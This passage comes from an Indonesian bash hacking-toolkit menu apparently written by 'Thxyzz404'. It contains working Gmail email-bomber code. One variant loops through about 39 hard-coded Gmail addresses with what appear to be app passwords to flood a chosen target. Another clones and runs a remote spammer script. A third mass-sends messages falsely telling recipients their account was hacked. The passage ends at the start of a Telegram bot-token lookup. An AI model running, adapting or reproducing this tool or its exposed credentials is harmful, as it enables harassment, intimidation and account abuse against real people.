       echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
       read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
              clear
             ;;
        41)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣤⣤⡴⣶⣶⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣷⣿⣶⣿⣧⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⠿⠿⠛⠛⠛⠋⠉⠉⠉⠛⠛⠛⠛⠿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣟⡁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⠿⠿⠿⣿⣿⣷⣦⡀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣄⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣦⣤⣤⣀⣀⣀⣀⣠⣤⠴⠖⠋⢉⣽⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⡀
⠀⠀⢠⣿⠟⠉⠁⠈⠉⠉⠙⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
⠀⢠⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠽⠟⠛⠉⠀⢀⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣷⣶⣦⣤⣤⣤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠈⠉⠛⠿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⠘⢿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⣿⣴⣿⣿⣄⠀⠀⠀⠀⠀⣀⣠⣴⠶⣿⣿⠋⠉⠉⠉⠙⢻⣿⡆⠀⠀⠀⠀⠀⠀⣀⣴⣶⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢹⣿⡍⠛⠻⢷⣶⣶⣶⠟⢿⣿⠗⠀⠹⠃⡀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⢀⣴⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠛⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⡇⠀⠀⠀⢻⣿⣿⠀⠈⠛⠀⠀⠀⢹⠇⠀⠀⠀⠀⢶⣿⠇⠀⢀⣴⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠁⠀⠀⠀⠀⠹⡇⠀⠀⠀⠀⠀⣀⡾⠀⠀⠀⠀⠀⢸⡿⠀⣠⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⣦⠀⠀⢠⣿⢳⠀⠀⠀⠙⣿⣿⠁⢰⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⣷⡾⠿⠃⢸⣷⣀⠀⢀⣾⠃⢀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⠻⠷⢾⣿⣿⣷⡿⠁⠀⢸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣷⣄⠀⠀⠉⠛⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣦⣄⡀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣶⣶⣾⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
              echo -e "\033[31;1m╔══════════════════════════════╗"
              echo -e "\033[31;1m║\033[36;1m        SPAMMER_GMAIL      \033[31;1m   ║"
              echo -e "\033[31;1m╚══════════════════════════════╝"
              echo -e "\033[31;1m║   ${r}[ ${g}01 ${r}] ${y}Spammer_V1     ${r}     ║"
              echo -e "\033[31;1m║   ${r}[ ${g}02 ${r}] ${y}Spammer_V2     ${r}     ║"
              echo -e "\033[31;1m║   ${r}[ ${g}03 ${r}] ${y}Spammer_V3     ${r}     ║"
              echo -e "\033[31;1m║   ${r}[ ${g}04 ${r}] ${y}Kembali Ke Awall ${r}   ║"
              echo -e "\033[31;1m╔══════════════════════════════╗"
              echo -e "\033[31;1m║\033[36;1m         BY.THXYZZ404      \033[31;1m   ║"
              echo -e "\033[31;1m╚══════════════════════════════╝"
echo -e "${g}"
read -p "Masukkan pilihan Anda : " kuy
case $kuy in
1|01)
m="\033[1;31m"
p="\033[0m"
k="\033[1;33m"
b="\033[1;36m"
res="\033[0m"
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
if ! command -v boxes &> /dev/null; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Modules blum terinstall menginstall..!!${n}"
    echo -e "${n}"
    pkg install boxes -y
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Modules sudah terinstall.${n}"
    sleep 2 
    clear 
fi
cok="ansi-rounded"
banner() {
echo -e "
${m}███████╗ ██████╗ ███╗   ███╗ █████╗ ██╗██╗${res}     
${m}██╔════╝██╔════╝ ████╗ ████║██╔══██╗██║██║${res}
${m}███████╗██║  ███╗██╔████╔██║███████║██║██║${res}     
${p}╚════██║██║   ██║██║╚██╔╝██║██╔══██║██║██║${res}     
${p}███████║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║███████╗${res}
${p}╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝${res}
${k}       [${b} DEVELOPMENT BY.THXYZZ404 ${k}]${res}
"
}
clear
banner | boxes -d "$cok"
echo -e "${g}"
echo -n "Masukkan target Gmail : "
read EMAIL_TUJUAN
echo -e "${y}"
echo -n "Masukkan subjek untuk Gmail : "
read SUBJEK
echo -e "${c}"
echo -n "Masukkan pesan untuk Gmail : "
read PESAN
python -c '
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import sys
import select
import tty
import termios
GREEN = "\033[1;32m"
RED = "\033[1;31m"
BLUE = "\033[1;34m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
RESET = "\033[0m"
accounts = [
    ["anonimousee909@gmail.com", "vwsz udcr zwtn nddt"],
    ["anonimouse90909@gmail.com", "hhgl fmji jsae sqxu"],
    ["anonimouse9099@gmail.com", "qpss riuo pkjk tmeg"],
    ["anonimouse90999@gmail.com", "ijrf hhuo jpml iysc"],
    ["aaabaaah2@gmail.com", "oqtx elxg cefv dgvd"],
    ["anjaynathan399@gmail.com", "cpil kwkt llab sodh"],
    ["joeellan26@gmail.com", "wnfe iboi ktrr uder"],
    ["bayarutangllu@gmail.com", "cbty vvaf rncu oawg"],
    ["cindyfiolita9@gmail.com", "kpvu treo hfar zqdy"],
    ["anonymousgalirus@gmail.com", "ltnc fedd qzsy lfwu"],
    ["gstorekonter4@gmail.com", "xwdq ugie fbjw xeaa"],
    ["makluetekerbpaluhekel@gmail.com", "oyys dexg uofj vhkt"],
    ["fire.send482@gmail.com", "dpus bvni hmvn caob"],
    ["jiki.mioli08@gmail.com", "gzwj sohl dzxd pteh"],
    ["tayotayooxirf@gmail.com", "edpj gvcx fehp rtfl"],
    ["tayo404tayyo404@gmail.com", "jeat hezh ditz akuk"],
    ["irfafitrio@gmail.com", "khtm tnxz nbey ahue"],
    ["sigmamewing1232@gmail.com", "trzs dett smbl iykw"],
    ["joyditiano9@gmail.com", "rnfv nfqa ggcf lyqn"],
    ["draid6247@gmail.com", "dhwm abuc vkan sofg"],
    ["daemontechx@gmail.com", "jxov iorq ztpw hirz"],
    ["daemoniumuserv2@gmail.com", "yexa nkvy ghqh hsbd"],
    ["daemoniumuser@gmail.com", "wgas iris atyy xpnc"],
    ["c26898771@gmail.com", "ykky jurp svqq kmhj"],
    ["rizkicuaca62@gmail.com", "azud gild ptqm ooip"],
    ["bunawarhadi@gmail.com", "qhub vsfb oytb qqoa"],
    ["gutodoang@gmail.com", "rcer clrw tckg ppea"],
    ["bocahbebanbocahbeban@gmail.com", "fdye aial ngai clqp"],
    ["siniluanjing484@gmail.com", "chji sayr htkq wjjz"],
    ["qoegvnv@gmail.com", "ueha fbsz unmb jqzj"],
    ["takame829@gmail.com", "firo ngvs xali pfjy"],
    ["haihakjsbsajsjnebsh5@gmail.com", "qvar taip eifk mxki"],
    ["ythead.gtrva001@gmail.com", "fdrr hjpa srza rops"],
    ["v8728799@gmail.com", "wjng geyu qrjb qrkz"],
    ["zarkymark7@gmail.com", "jlem mvwf nsog bvpq"],
    ["periport01@gmail.com", "chpo ubdi snry fafw"],
    ["reyhad52@gmail.com", "cnyo txjs jzbi hkea"],
    ["v8728799@gmail.com", "wjng geyu qrjb qrkz"],
    ["zarkymark7@gmail.com", "jlem mvwf nsog bvpq"],
]
target = "'"$EMAIL_TUJUAN"'"
subject = "'"$SUBJEK"'"
message = "'"$PESAN"'"
def loading_animation():
    chars = ["😈", "☠️", "🤬", "👹"]
    for _ in range(5):
        for char in chars:
            sys.stdout.write(f"\r{GREEN}[ 🚀 ]{CYAN} Processing..!! {RED}[ {char} {RED}]")
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write("\r" + " " * 50 + "\r")
    sys.stdout.flush()
def get_key():
    def is_data():
        return select.select([sys.stdin], [], [], 0) == ([sys.stdin], [], [])
    old_settings = termios.tcgetattr(sys.stdin)
    try:
        tty.setcbreak(sys.stdin.fileno())
        if is_data():
            key = sys.stdin.read(1)
            return key
        return None
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
print(f"\n{BLUE}╔══════════════════════════════════════════════════════╗{RESET}")
print(f"{BLUE}║         {RED}EMAIL BOMBER - THXYZZ404 CYBER TEAM          {BLUE}║{RESET}")
print(f"{BLUE}╚══════════════════════════════════════════════════════╝{RESET}")
print(f"{YELLOW}Target Gmail : {GREEN}{target}{RESET}")
print(f"{YELLOW}Subject : {GREEN}{subject}{RESET}")
print(f"{BLUE}-------------------------------------------------------{RESET}")
print(f"{CYAN}Tekan 'q' untuk menghentikan proses pengiriman{RESET}\n")
stop_flag = False
count = 0
while not stop_flag:
    for email, password in accounts:
        if stop_flag:
            break
        try:
            loading_animation()
            msg = MIMEMultipart()
            msg["From"] = email
            msg["To"] = target
            msg["Subject"] = subject
            msg.attach(MIMEText(message, "plain"))
            server = smtplib.SMTP("smtp.gmail.com", 587)
            try:
                server.starttls()
                server.login(email, password)
                server.send_message(msg)
            finally:
                server.quit()
            count += 1
            sys.stdout.write(f"\r{RED}[ {GREEN}SUKSES ATACCK {RED}]{YELLOW} Email {RED}[ {CYAN}{count} {RED}]{GREEN} {target}{RESET}")
            sys.stdout.flush()
        except Exception as e:
            sys.stdout.write(f"\r{RED}[ Gagal ] Email {count} {target}{RESET}")
            sys.stdout.flush()
        start_time = time.time()
        while time.time() - start_time < 5:
            key = get_key()
            if key and key.lower() == 'q':
                stop_flag = True
                break
            time.sleep(0.1)
sys.stdout.write("\r" + " " * 50 + "\r")
sys.stdout.flush()
print(f"\n{RED}[!] Proses dihentikan oleh pengguna.{RESET}")
print(f"{YELLOW}[i] Total email terkirim : {GREEN}{count}{RESET}")
print(f"{BLUE}╔══════════════════════════════════════════════════════╗{RESET}")
print(f"{GREEN}║         TERIMA KASIH TELAH MENGGUNAKAN TOOL INI      ║{RESET}")
print(f"{BLUE}╚══════════════════════════════════════════════════════╝{RESET}")
'
      ;;
   2|02)
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
JEMBUT="https://github.com/QrwszXnXnchommed0e56/.Spammer"
BAPAK_LU_YATIM="$HOME/.Spammer"
DECODER_KONTOLL=32
if [[ -d "$BAPAK_LU_YATIM" && -f "$BAPAK_LU_YATIM/Spam_Gmail.py" ]]; then
    clear 
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${c} Mohon bersabar sedang running..!!"
    echo ""
    cd "$BAPAK_LU_YATIM"
    chmod +x "Spam_Gmail.py" >/dev/null 2>&1
    clear
    python3 "Spam_Gmail.py"
    exit 1
fi
rm -rf "$BAPAK_LU_YATIM" 2>/dev/null
git clone --depth "$DECODER_KONTOLL" "$JEMBUT" "$BAPAK_LU_YATIM" >/dev/null 2>&1 || {
    echo ""
    echo -e "${r}[ ${g}PEMBERITAHUAN ${r}]${y} Jika anda ingin kembali normal script kluar dari tools lV lalu jalankan ulang."
    echo ""
}
rm -rf "$BAPAK_LU_YATIM/.git" 2>/dev/null
cd "$BAPAK_LU_YATIM" || {
    echo ""
    echo -e "${r}[ ${g}PEMBERITAHUAN ${r}]${y} Jika anda ingin kembali normal script kluar dari tools lV lalu jalankan ulang."
    echo ""
}
if [[ -f "Spam_Gmail.py" ]]; then
    chmod +x "Spam_Gmail.py"
    clear 
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${c} Mohon bersabar sedang running..!!"
    echo ""
    python3 "Spam_Gmail.py"
else
    clear
    echo ""
    echo -e "${r}[ ${g}PEMBERITAHUAN ${r}]${y} Jika anda ingin kembali normal script kluar dari tools lV lalu jalankan ulang."
    echo ""
fi
 ;;
   3|03)
set +x
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
CONFIG_FILE=".config.json"
DEFAULT_SUBJECT="Thanks you for to ToolslV‼️"
format_body() {
    local user_message="$1"
    local today=$(date +"%Y - %m - %d")
    echo -e "${user_message}\n\nAkun anda telah di retas.\nDate ${today}"
}
validate_smtp_credentials() {
    local pengirim="$1"
    local password="$2"
    python3 - <<EOF
import smtplib
pengirim = "$pengirim"
password = "$password"
try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(pengirim, password)
    server.quit()
    print("Authentication successful")
except Exception as e:
    print(f"{r}[{g} !! {r}]{c} Gagal memvalidasi kredensial SMTP : {str(e)}")
    exit(1)
EOF
}
load_config() {
    clear
    echo ""
    echo "
██╗      ██████╗  ██████╗ ██╗███╗   ██╗
██║     ██╔═══██╗██╔════╝ ██║████╗  ██║
██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
██║     ██║   ██║██║   ██║██║██║╚██╗██║
███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝ " | lolcat
echo ""
    if [ -f "$CONFIG_FILE" ]; then
        email=$(jq -r '.email' "$CONFIG_FILE")
        app_password=$(jq -r '.app_password' "$CONFIG_FILE")
        if [ -n "$email" ] && [ -n "$app_password" ]; then
            echo -e "${p}Konfigurasi ditemukan!"
            echo ""
            echo -e "${b}Gmail Pengirim : ${g}$email"
            echo -e "${y}Gunakan konfigurasi ini? (y/n)"
            echo ""
            echo -e -n "${r}[${g} ?? ${r}]${c} Pilih ${n}: ${g}"
            read use_existing
            if [ "$use_existing" = "y" ] || [ "$use_existing" = "Y" ]; then
                if validate_smtp_credentials "$email" "$app_password" | grep -q "Authentication successful"; then
                    export email app_password
                    return
                else
                    echo -e "${r}Kredensial tidak valid."
                fi
            fi
        else
            echo -e "${r}Konfigurasi tidak valid."
        fi
    fi
    echo -e "${g}Masukkan Alamat Gmail & App Password"
    echo -e "${g}Untuk Dijadikan Sebagai Akun Pengirim"
    echo -e "${r}Spam Gmail"
    echo ""
    echo -e "${y}Silahkan daftar dulu di:"
    echo -e "${c}Link : https://myaccount.google.com/u/1/apppasswords?pli=1&rapt=AEjHL4Orttj8WQi5YEjJrvl7LpYhVYlGUVd58Ve6UCQjr3hjF9J_rW96Kphl4S_2fsNS-_pzjs5wXTBbqaTxgK2AsnNqBadY-Y_csqsT6uIt87GGb-Prkwk&pageId=none "
    echo ""
    echo ""
    echo -e -n "${r}[${g} ?? ${r}]${c} Masukkan Sender Gmail ${n}: ${g}"
    read email
    echo ""
    echo -e -n "${r}[${g} ?? ${r}]${y} Masukkan App Password Gmail ${n}: ${g}"
    read app_password
    echo ""
    if validate_smtp_credentials "$email" "$app_password" | grep -q "Authentication successful"; then
        echo "{\"email\": \"$email\", \"app_password\": \"$app_password\"}" > "$CONFIG_FILE"
        export email app_password
    else
        clear
        echo ""
        echo -e "${r}Gagall menyimpan konfigurasi."
        echo ""
    fi
}
kirim_email() {
    local pengirim="$1"
    local password="$2"
    local penerima="$3"
    local body="$4"
    local jumlah="$5"
    python3 - <<EOF
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
pengirim = "$pengirim"
password = "$password"
penerima = "$penerima"
body = """$body"""
jumlah = int("$jumlah")
DEFAULT_SUBJECT = "$DEFAULT_SUBJECT"
body = """$(format_body "$body")"""
msg = MIMEMultipart()
msg["From"] = pengirim
msg["To"] = penerima
msg["Subject"] = DEFAULT_SUBJECT
msg.attach(MIMEText(body, "plain"))
sukses = 0
gagal = 0
start_time = time.time()
try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(pengirim, password)
    for i in range(jumlah):
        try:
            server.sendmail(pengirim, penerima, msg.as_string())
            sukses += 1
            print(f"{r}[{g} {i+1:02} {r}]{g} Pesan Sukses Terkirim ✅")
        except Exception as e:
            gagal += 1
            print(f"{r}[{g} {i+1:02} {r}]{c} Pesan Gagal ❌")
    server.quit()
except Exception as e:
    print(f"❌ {y}Gagal mengirim pesan{r} :{g} {str(e)}")
    exit(1)
end_time = time.time()
durasi = round(end_time - start_time, 2)
print("\033\ac")
print("\033[35;1m")
print("""
      ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
      ⣿⠛⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢁⠆⢻⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⡿⢻⣿
      ⡇⠆⡘⢿⣿⣿⡿⢈⢻⣿⣿⣿⠇⣤⡏⡄⢿⣿⣿⣿⢃⠘⣿⣿⣿⡟⠐⡌⣿
      ⠃⢠⣆⠌⢿⣿⠇⣻⢊⢻⣿⡟⢨⢺⡷⢸⠈⣿⣿⢂⢰⡄⣿⣿⠏⣐⣴⠠⢹
      ⠘⡘⣿⣹⢸⣿⣀⢻⡞⣨⣿⣶⢀⣣⣥⣇⢲⣿⣧⡘⡮⢃⣸⣧⢸⡼⡟⡠⢸
      ⣧⠈⣦⢻⠸⣿⣿⠈⣧⢈⠻⠏⣼⣻⢟⣿⡌⠿⢋⢠⢡⢸⣿⡿⢸⢣⡞⢀⣿
      ⣿⡄⠺⣼⣇⠙⣣⣺⣿⡷⢉⡜⠛⠛⠚⠛⠛⣄⠱⣿⣎⢤⡛⢃⣾⡵⠂⣸⣿
      ⣿⣧⠐⣽⣿⣷⣦⣭⢥⣶⣿⣿⣿⣿⠀⣿⣿⣿⣳⣦⡭⣭⣴⣿⣿⠽⠀⣿⣿
      ⣿⣿⠀⠛⣻⡭⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣷⣎⣶⡮⣽⡋⠃⢀⣿⣿
      ⣿⣿⠀⢸⣽⣴⣽⣿⣿⣿⣿⣿⣿⣿⣤⣿⣿⣿⣿⣿⣿⣿⣝⣽⣿⠀⢸⣿⣿
      ⡿⠟⠀⢀⣀⠀⠀⢀⣀⠀⣀⡀⠀⣀⠀⠀⠀⣀⠀⠀⠀⠀⣀⣀⠀⠀⢘⢿⣿
      ⣷⣤⡄⢘⣿⠇⣠⡿⠋⠀⣿⡇⠀⣿⣧⡀⠀⣿⠀⢠⣾⠛⠉⠋⠁⠀⣤⣄⣿
      ⣿⣿⡇⢨⣿⡿⣿⢄⠀⠀⣿⠆⠀⡇⠹⣷⡄⣿⠀⣿⡇⠀⠀⢠⣤⠀⣿⣿⣿
      ⣿⣿⡇⢸⣿⡅⠘⢿⣦⠀⣿⡇⠀⣷⠀⠈⢿⣿⠀⠹⣷⣄⣀⣸⣿⠀⣿⣿⣿
      ⣿⣿⣧⣈⣟⣇⣀⣨⣉⣅⣭⣃⣤⣭⣄⣤⣤⣩⣥⣤⣤⣭⣭⣭⣭⣤⣿⣿⣟
""")
print(f"{b}Gmail Pengirim{r} : {g}{pengirim}")
print(f"{b}Gmail Tujuan{r} : {g}{penerima}")
print(f"{b}Pesan Terkirim{r} : {g}{sukses}")
print(f"{b}Pesan Gagal{r} : {g}{gagal}")
print(f"{b}Durasi Waktu{r} : {g}{durasi} detik")
EOF
}
reset_config() {
    if [ -f "$CONFIG_FILE" ]; then
        rm "$CONFIG_FILE"
        clear 
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} Sender berhasil di riset..!!"
        echo ""
        sleep 4
        clear 
        exec bash "${BASH_SOURCE[0]}" "$@"
    else
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} Tidak ada config yang tersimpan..!!"
        echo ""
        sleep 4 
    fi
}
load_config
    clear
    echo ""
    echo "
⣿⣿⣿⣿⣿⣿⣿⠿⠟⠿⠿⣿⣿⠿⠛⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠿⠟⠛⠛⠁⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠉⠀⠀⠀⠉⠛⢿⣿⣿⣿
⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿
⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣾
⣿⣄⡀⢀⡀⠀⠀⠀⠀⣠⣤⣤⣴⠿⠿⣦⣄⣀⣀⣴⣄⡀⠀⠀⣠⣿⣿⣿
⣿⣿⣿⣿⣿⣷⣶⠶⠟⠋⠈⠉⠀⠀⠀⠀⠉⠉⠉⠁⠉⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣶⣤⣴⣷⣤⣀⣠⣶⣄⣀⣴⣶⣤⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠿⠟⠛⠛⠛⠛⠉⠀⠀⠈⠙⠛⠛⠛⠛⠿⠿⣿⣿⣿⣿⣿
⣿⣿⣿⡏⠀⣤⣶⣶⣾⣿⣿⣿⡇⠀⠀⠘⣿⣿⣿⣿⣶⣶⣦⡄⠈⣿⣿⣿
⣿⣿⣿⣿⣦⣄⣈⣉⠉⠛⠛⠛⠀⠀⠀⠀⠙⠛⠛⠋⢉⣉⣠⣤⣾⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣭⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣬⣿⣿⣿⣿⣿⣿⣿⣿
" | lolcat
    echo ""
    echo -e "${r}[${g} 01 ${r}] ${y}Gas Bomb Gmail"
    echo -e "${r}[${g} 02 ${r}] ${y}Reset Sender"
    echo -e "${r}[${g} 03 ${r}] ${p}Keluar"
    echo ""
    echo -e -n "${r}[${g} >_< ${r}]${c} Masukkan Pilihan Anda ${n}: ${g}"
    read choice
    echo ""
    case $choice in
        1)
            echo -e -n "${r}[${g} ?? ${r}]${g} Masukkan Gmail Target ${n}: ${y}"
            read penerima
            echo ""
            echo -e -n "${r}[${g} ?? ${r}]${g} Masukkan Isi Pesan ${n}: ${c}"
            read body
            echo ""
            echo -e -n "${r}[${g} ?? ${r}]${g} Masukkan Jumlah Bomb ${n}: ${p}"
            read jumlah
            clear
            echo ""
            kirim_email "$email" "$app_password" "$penerima" "$body" "$jumlah"
            ;;
        2)
            reset_config
            ;;
        3)
            clear
            echo ""
            echo -e "${r} Keluar dari tools..!!"
            echo ""
            ;;
        *)
            clear
            echo ""
            echo -e "${r} Pilihan Anda Tidak Valid..!!"
            echo -e "${g}"
            read -p "Tekan Enter untuk melanjutkanya..!!"
            ;;
       esac
        ;;
 4|04)
      clear
      ;;
    *)
  ;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
  ;;
      42)
            echo ""
            mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
            echo -e "${c} Anda Memilih Menu Hacking..!!"
            echo ""
            echo -e "${r} VIP UNLOCK..!!"
            sleep 2
            clear
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
y='\033[33;1m'
b='\033[34;1m'
woi() {
    text="$1"
    for ((i = 0; i < ${#text}; i++)); do
        echo -n "${text:$i:1}"
        sleep 0.0001
    done
}
mek() {
woi "
██████╗  ██████╗ ████████╗███████╗
██╔══██╗██╔═══██╗╚══██╔══╝╚══███╔╝
██████╔╝██║   ██║   ██║     ███╔╝ 
██╔══██╗██║   ██║   ██║    ███╔╝  
██████╔╝╚██████╔╝   ██║   ███████╗
╚═════╝  ╚═════╝    ╚═╝   ╚══════╝
" | lolcat
echo ""
echo -e "${p} Development ${g}: ${c}Thxyzz404"
echo ""
echo -e "${r}[${y} 01 ${r}] ${g}Dork botz"
echo -e "${r}[${y} 02 ${r}] ${g}Dork pemilik"
echo -e "${r}[${y} 00 ${r}] ${c}Keluar"
}
get_bot() {
clear
echo -e "${g}"
figlet Cek-Botz
echo "Development : By.Thxyzz404" | lolcat
echo -e "${c}"
read -p "Masukkan Botz Token : " TOKEN
echo -e "${c}"
clear
figlet Hasil Info
echo "Development : By.Thxyzz404" | lolcat
echo ""
RESPONSE=$(curl -s "https://api.telegram.org/bot$TOKEN/getMe")
USERNAME=$(echo "$RESPONSE" | jq -r '.result.username')
BOT_ID=$(echo "$RESPONSE" | jq -r '.result.id')
